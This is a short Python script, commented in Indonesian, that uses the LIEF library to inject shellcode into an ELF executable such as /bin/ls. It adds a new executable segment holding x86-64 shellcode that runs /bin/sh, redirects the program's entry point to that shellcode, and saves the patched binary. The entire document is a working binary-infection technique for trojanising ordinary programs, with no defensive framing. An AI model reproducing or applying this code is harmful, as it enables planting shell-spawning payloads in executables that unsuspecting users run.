import lief # lief version 0.16.5

# 1. Parse ELF target (misalnya /bin/ls)
binary = lief.parse("target")

# 2. Shellcode
shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
shellcode_bytes = list(shellcode.encode('latin'))

# 3. Buat segment baru
segment = lief.ELF.Segment()
segment.content = shellcode_bytes
segment.virtual_address = 0  # biarkan 0, LIEF akan menghitung otomatis
segment.alignment = 0x1000
segment.flags = lief.ELF.Segment.FLAGS.R | lief.ELF.Segment.FLAGS.X
segment.type = lief.ELF.Segment.TYPE.LOAD

# 4. Tambahkan ke ELF
added_segment = binary.add(segment)

# 5. Hitung alamat virtual payload
payload_va = added_segment.virtual_address

# 6. Set entrypoint ELF ke shellcode
binary.header.entrypoint = payload_va

# 7. Simpan ELF hasil patch
binary.write("patched_binary")
